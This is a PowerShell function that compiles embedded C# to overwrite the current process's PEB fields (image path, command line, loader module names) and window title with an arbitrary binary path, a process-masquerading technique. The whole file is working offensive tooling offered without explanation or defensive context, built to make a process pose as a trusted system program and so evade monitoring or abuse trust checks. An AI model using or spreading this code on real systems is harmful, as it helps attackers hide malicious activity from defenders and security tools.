function Invoke-MasqPEB
{    
    [CmdletBinding()]
    Param (
        [String]
        $path = ""

    )
$masq = @"
using System;
using System.IO;
using System.Text;
using System.Diagnostics;
using System.Runtime.InteropServices;


namespace MasqPEB
{
    public class PEBMasq
    {
        [StructLayout(LayoutKind.Sequential)]
        public struct UNICODE_STRING : IDisposable
        {
            public ushort Length;
            public ushort MaximumLength;
            private IntPtr buffer;

            public UNICODE_STRING(string s)
            {
                Length = (ushort)(s.Length * 2);
                MaximumLength = (ushort)(Length + 2);
                buffer = Marshal.StringToHGlobalUni(s);
            }

            public void Dispose()
            {
                Marshal.FreeHGlobal(buffer);
                buffer = IntPtr.Zero;
            }

            public override string ToString()
            {
                return Marshal.PtrToStringUni(buffer);
            }
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct _LIST_ENTRY
        {
            public IntPtr Flink;
            public IntPtr Blink;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct _PROCESS_BASIC_INFORMATION
        {
            public IntPtr ExitStatus;
            public IntPtr PebBaseAddress;
            public IntPtr AffinityMask;
            public IntPtr BasePriority;
            public UIntPtr UniqueProcessId;
            public IntPtr InheritedFromUniqueProcessId;

            public int Size
            {
                get { return (6 * IntPtr.Size); }
            }
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct RTL_USER_PROCESS_PARAMETERS
        {
            public UInt32 MaximumLength;
            public UInt32 Length;
            public UInt32 Flags;
            public UInt32 DebugFlags;
            public IntPtr ConsoleHandle;
            public UInt32 ConsoleFlags;
            public IntPtr StdInputHandle;
            public IntPtr StdOutputHandle;
            public IntPtr StdErrorHandle;
            public UNICODE_STRING CurrentDirectoryPath;
            public IntPtr CurrentDirectoryHandle;
            public UNICODE_STRING DllPath;
            public UNICODE_STRING ImagePathName;
            public UNICODE_STRING CommandLine;
        };

        /// Partial _PEB
        [StructLayout(LayoutKind.Explicit, Size = 0x40)]
        public struct _PEB
        {
            [FieldOffset(0x000)]
            public byte InheritedAddressSpace;
            [FieldOffset(0x001)]
            public byte ReadImageFileExecOptions;
            [FieldOffset(0x002)]
            public byte BeingDebugged;
            [FieldOffset(0x003)]
#if WIN64
            public byte Spare;
            [FieldOffset(0x008)]
            public IntPtr Mutant;
            [FieldOffset(0x010)]
            public IntPtr ImageBaseAddress;     // (PVOID) 
            [FieldOffset(0x018)]
            public IntPtr Ldr;                  // (PPEB_LDR_DATA)
            [FieldOffset(0x020)]
            public IntPtr ProcessParameters;    // (PRTL_USER_PROCESS_PARAMETERS)
            [FieldOffset(0x028)]
            public IntPtr SubSystemData;        // (PVOID) 
            [FieldOffset(0x030)]
            public IntPtr ProcessHeap;          // (PVOID) 
            [FieldOffset(0x038)]
            public IntPtr FastPebLock;          // (PRTL_CRITICAL_SECTION)
#else
            public byte Spare;
            [FieldOffset(0x004)]
            public IntPtr Mutant;
            [FieldOffset(0x008)]
            public IntPtr ImageBaseAddress;     // (PVOID) 
            [FieldOffset(0x00c)]
            public IntPtr Ldr;                  // (PPEB_LDR_DATA)
            [FieldOffset(0x010)]
            public IntPtr ProcessParameters;    // (PRTL_USER_PROCESS_PARAMETERS)
            [FieldOffset(0x014)]
            public IntPtr SubSystemData;        // (PVOID) 
            [FieldOffset(0x018)]
            public IntPtr ProcessHeap;          // (PVOID) 
            [FieldOffset(0x01c)]
            public IntPtr FastPebLock;          // (PRTL_CRITICAL_SECTION)
#endif
        }

        /// Partial _PEB_LDR_DATA
        [StructLayout(LayoutKind.Sequential)]
        public struct _PEB_LDR_DATA
        {
            public UInt32 Length;
            public Byte Initialized;
            public IntPtr SsHandle;
            public _LIST_ENTRY InLoadOrderModuleList;
            public _LIST_ENTRY InMemoryOrderModuleList;
            public _LIST_ENTRY InInitializationOrderModuleList;
            public IntPtr EntryInProgress;
        }

        /// Partial _LDR_DATA_TABLE_ENTRY
        [StructLayout(LayoutKind.Sequential)]
        public struct _LDR_DATA_TABLE_ENTRY
        {
            public _LIST_ENTRY InLoadOrderLinks;
            public _LIST_ENTRY InMemoryOrderLinks;
            public _LIST_ENTRY InInitializationOrderLinks;
            public IntPtr DllBase;
            public IntPtr EntryPoint;
            public UInt32 SizeOfImage;
            public UNICODE_STRING FullDllName;
            public UNICODE_STRING BaseDllName;
        }

        [Flags]
        public enum ProcessAccessFlags : uint
        {
            All = 0x001F0FFF,
            Terminate = 0x00000001,
            CreateThread = 0x00000002,
            VirtualMemoryOperation = 0x00000008,
            VirtualMemoryRead = 0x00000010,
            VirtualMemoryWrite = 0x00000020,
            DuplicateHandle = 0x00000040,
            CreateProcess = 0x000000080,
            SetQuota = 0x00000100,
            SetInformation = 0x00000200,
            QueryInformation = 0x00000400,
            QueryLimitedInformation = 0x00001000,
            Synchronize = 0x00100000
        }

        [DllImport("ntdll.dll")]
        public static extern int NtQueryInformationProcess(
            IntPtr ProcessHandle,
            int ProcessInformationClass,
            IntPtr ProcessInformation,
            int ProcessInformationLength,
            ref int ReturnLength);

        [DllImport("ntdll.dll")]
        public static extern void RtlEnterCriticalSection(
            IntPtr lpCriticalSection);

        [DllImport("ntdll.dll")]
        public static extern void RtlLeaveCriticalSection(
            IntPtr lpCriticalSection);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr OpenProcess(
             ProcessAccessFlags dwDesiredAccess,
             bool bInheritHandle,
             int dwProcessId);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool ReadProcessMemory(
             IntPtr hProcess,
             IntPtr lpBaseAddress,
             IntPtr lpBuffer,
             int dwSize,
             out IntPtr lpNumberOfBytesRead
            );

        [DllImport("kernel32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        static extern bool CloseHandle(
            IntPtr hObject);

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        static extern uint GetWindowsDirectory(StringBuilder lpBuffer,
            uint uSize);

        [DllImport("user32.dll", SetLastError = true)]
        static extern bool SetWindowText(
            IntPtr hWnd,
            string text);

        [DllImport("user32.dll")]
        static extern IntPtr FindWindow(
            string windowClass,
            string windowName);

        [DllImport("kernel32.dll", SetLastError = true)]
        [PreserveSig]
        public static extern uint GetModuleFileName(
            [In] IntPtr hModule,
            [Out] StringBuilder lpFilename,
            [In] [MarshalAs(UnmanagedType.U4)]
             int nSize);

        [DllImport("kernel32.dll")]
        public static extern Boolean VirtualProtectEx(
            IntPtr hProcess,
            IntPtr lpAddress,
            UInt32 dwSize,
            UInt32 flNewProtect,
            ref IntPtr lpflOldProtect);

        [DllImport("kernel32.dll")]
        public static extern Boolean WriteProcessMemory(
            IntPtr hProcess,
            IntPtr lpBaseAddress,
            IntPtr lpBuffer,
            UInt32 nSize,
            ref IntPtr lpNumberOfBytesWritten);


        static T PtrToStructure<T>(IntPtr handle)
        {
            T type = (T)Marshal.PtrToStructure(handle, typeof(T));
            FreeHandle(handle);
            return type;
        }

        static void FreeHandle(IntPtr handle)
        {
            Marshal.FreeHGlobal(handle);
            handle = IntPtr.Zero;
        }

        static IntPtr StructureToPtr(object obj)
        {
            IntPtr ptr = Marshal.AllocHGlobal(Marshal.SizeOf(obj));
            Marshal.StructureToPtr(obj, ptr, false);
            return ptr;
        }


        public static bool RtlInitUnicodeString(IntPtr procHandle, IntPtr lpDestAddress, string pebParam, string masqBinary)
        {
            // Create new UNICODE_STRING Structure
            UNICODE_STRING masq = new UNICODE_STRING(masqBinary);

            // Create a pointer to a unmanaged Structure
            IntPtr masqPtr = StructureToPtr(masq);

            // Change access protection of a memory region to -> PAGE_EXECUTE_READWRITE
            IntPtr lpflOldProtect = IntPtr.Zero;
            uint PAGE_EXECUTE_READWRITE = 0x40;
            if (!VirtualProtectEx(procHandle, lpDestAddress, (uint)Marshal.SizeOf(typeof(UNICODE_STRING)), PAGE_EXECUTE_READWRITE, ref lpflOldProtect))
            {
                return false;
            }

            // Overwrite PEB UNICODE_STRING Structure
            IntPtr lpNumberOfBytesWritten = IntPtr.Zero;
            if (!WriteProcessMemory(procHandle, lpDestAddress, masqPtr, (uint)Marshal.SizeOf(typeof(UNICODE_STRING)), ref lpNumberOfBytesWritten))
            {
                return false;
            }

            // Read new Masq into UNICODE_STRING Structure
            UNICODE_STRING NewMasq = new UNICODE_STRING();
            IntPtr NewMasqPtr = StructureToPtr(NewMasq);

            IntPtr lpNumberOfBytesRead = IntPtr.Zero;
            if (!ReadProcessMemory(procHandle, lpDestAddress, NewMasqPtr, Marshal.SizeOf(typeof(UNICODE_STRING)), out lpNumberOfBytesRead))
            {
                return false;
            }
            NewMasq = PtrToStructure<UNICODE_STRING>(NewMasqPtr);

            // Free Unmanged Memory
            FreeHandle(masqPtr);

            if (NewMasq.ToString() != masqBinary)
            {
                return false;
            }

            return true;
        }


        public static bool MasqueradePEB(string masqBinary)
        {
            string Arch = System.Environment.GetEnvironmentVariable("PROCESSOR_ARCHITECTURE");

            // Retrieve information about the specified process
            int dwPID = Process.GetCurrentProcess().Id;
            IntPtr procHandle = OpenProcess(ProcessAccessFlags.QueryInformation | ProcessAccessFlags.VirtualMemoryRead | ProcessAccessFlags.VirtualMemoryWrite | ProcessAccessFlags.VirtualMemoryOperation, false, dwPID);

            _PROCESS_BASIC_INFORMATION pbi = new _PROCESS_BASIC_INFORMATION();
            IntPtr pbiPtr = StructureToPtr(pbi);
            int returnLength = 0;

            int status = NtQueryInformationProcess(procHandle, 0, pbiPtr, Marshal.SizeOf(pbi), ref returnLength);
            if (status != 0)
            {
                return false;
            }
            pbi = PtrToStructure<_PROCESS_BASIC_INFORMATION>(pbiPtr);

            Console.WriteLine("[+] Process ID is: {0}", pbi.UniqueProcessId);

            // Read pbi PebBaseAddress into PEB Structure
            IntPtr lpNumberOfBytesRead = IntPtr.Zero;

            _PEB peb = new _PEB();
            IntPtr pebPtr = StructureToPtr(peb);
            if (!ReadProcessMemory(procHandle, pbi.PebBaseAddress, pebPtr, Marshal.SizeOf(peb), out lpNumberOfBytesRead))
            {
                return false;
            }
            peb = PtrToStructure<_PEB>(pebPtr);

            // Read peb ProcessParameters into RTL_USER_PROCESS_PARAMETERS Structure
            RTL_USER_PROCESS_PARAMETERS upp = new RTL_USER_PROCESS_PARAMETERS();
            IntPtr uppPtr = StructureToPtr(upp);
            if (!ReadProcessMemory(procHandle, peb.ProcessParameters, uppPtr, Marshal.SizeOf(upp), out lpNumberOfBytesRead))
            {
                return false;
            }
            upp = PtrToStructure<RTL_USER_PROCESS_PARAMETERS>(uppPtr);

            // Read Ldr Address into PEB_LDR_DATA Structure
            _PEB_LDR_DATA pld = new _PEB_LDR_DATA();
            IntPtr pldPtr = StructureToPtr(pld);
            if (!ReadProcessMemory(procHandle, peb.Ldr, pldPtr, Marshal.SizeOf(pld), out lpNumberOfBytesRead))
            {
                return false;
            }
            pld = PtrToStructure<_PEB_LDR_DATA>(pldPtr);

            // Change Current Working Directory and Window title
            Directory.SetCurrentDirectory(Environment.SystemDirectory);

            // Set the Title of the Window                                                                   
            SetWindowText(Process.GetCurrentProcess().MainWindowHandle, masqBinary);

            // Let's overwrite UNICODE_STRING structs in memory

            // Take ownership of PEB
            RtlEnterCriticalSection(peb.FastPebLock);

            // Masquerade ImagePathName and CommandLine
            IntPtr ImagePathNamePtr = IntPtr.Zero;
            IntPtr CommandLinePtr = IntPtr.Zero;

            if (Arch == "AMD64")
            {
                ImagePathNamePtr = new IntPtr(peb.ProcessParameters.ToInt64() + 0x60);
                CommandLinePtr = new IntPtr(peb.ProcessParameters.ToInt64() + 0x70);
            }
            else
            {
                ImagePathNamePtr = new IntPtr(peb.ProcessParameters.ToInt32() + 0x38);
                CommandLinePtr = new IntPtr(peb.ProcessParameters.ToInt32() + 0x40);
            }

            if (!RtlInitUnicodeString(procHandle, ImagePathNamePtr, "ImagePathName", masqBinary))
            {
                return false;
            }
            if (!RtlInitUnicodeString(procHandle, CommandLinePtr, "CommandLine", masqBinary))
            {
                return false;
            }

            // Masquerade FullDllName and BaseDllName
            StringBuilder wModuleFileName = new StringBuilder(255);
            GetModuleFileName(IntPtr.Zero, wModuleFileName, wModuleFileName.Capacity);
            string wExeFileName = wModuleFileName.ToString();
            string wFullDllName = null;

            _PEB_LDR_DATA StartModule = (_PEB_LDR_DATA)Marshal.PtrToStructure(peb.Ldr, typeof(_PEB_LDR_DATA));
            IntPtr pStartModuleInfo = StartModule.InLoadOrderModuleList.Flink;
            IntPtr pNextModuleInfo = pld.InLoadOrderModuleList.Flink;
            do
            {
                // Read InLoadOrderModuleList.Flink Address into LDR_DATA_TABLE_ENTRY Structure
                _LDR_DATA_TABLE_ENTRY ldte = (_LDR_DATA_TABLE_ENTRY)Marshal.PtrToStructure(pNextModuleInfo, typeof(_LDR_DATA_TABLE_ENTRY));
                IntPtr FullDllNamePtr = IntPtr.Zero;
                IntPtr BaseDllNamePtr = IntPtr.Zero;

                if (Arch == "AMD64")
                {
                    FullDllNamePtr = new IntPtr(pNextModuleInfo.ToInt64() + 0x48);
                    BaseDllNamePtr = new IntPtr(pNextModuleInfo.ToInt64() + 0x58);
                }
                else
                {
                    FullDllNamePtr = new IntPtr(pNextModuleInfo.ToInt32() + 0x24);
                    BaseDllNamePtr = new IntPtr(pNextModuleInfo.ToInt32() + 0x2C);
                }

                // Read FullDllName into string
                wFullDllName = ldte.FullDllName.ToString();

                if (wExeFileName == wFullDllName)
                {
                    if (!RtlInitUnicodeString(procHandle, FullDllNamePtr, "FullDllName", masqBinary))
                    {
                        return false;
                    }
                    if (!RtlInitUnicodeString(procHandle, BaseDllNamePtr, "BaseDllName", masqBinary))
                    {
                        return false;
                    }
                    break;
                }

                pNextModuleInfo = ldte.InLoadOrderLinks.Flink;

            } while (pNextModuleInfo != pStartModuleInfo);

            //Release ownership of PEB
            RtlLeaveCriticalSection(peb.FastPebLock);

            // Release Process Handle
            CloseHandle(procHandle);

            return true;
        }

    }
}
"@

Add-Type -TypeDefinition $masq -Language CSharp
[MasqPEB.PEBMasq]::MasqueradePEB("$path")

}
